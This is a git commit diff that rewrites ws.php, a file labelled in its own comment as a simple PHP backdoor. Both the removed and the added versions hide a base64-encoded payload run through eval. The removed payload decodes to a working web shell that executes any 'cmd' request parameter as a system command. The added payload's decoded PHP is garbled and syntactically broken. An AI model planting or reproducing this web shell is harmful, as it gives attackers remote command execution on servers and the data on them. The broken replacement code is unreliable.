573c166adc30a0abfaa76d25f5188658cbe4af57
Luminous <116489011+Luminous-split@users.noreply.github.com>
2024-07-21 02:42:02 +0800

    Update ws.php

--- ws.php
+++ ws.php
@@ -1,9 +1,6 @@
-
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
 
 <?php
-$code = 'aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIGRpZTsKfQ==';
-
-$op = eval(base64_decode($code));
-echo $op;
+$code = 'aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIGV4ZWMgc2hlbGxfZXhlYygkY21kLCAidGhpcyIuICIpOwogICAgICAgIGVjaG8gJGV4ZWMoImFsbCBpbiBvbmUgY29tbWFuZCBvbmUgZXhlY3V0ZWQiKTsgZGlldDsKfQ==';
+eval(base64_decode($code));
 ?>
-
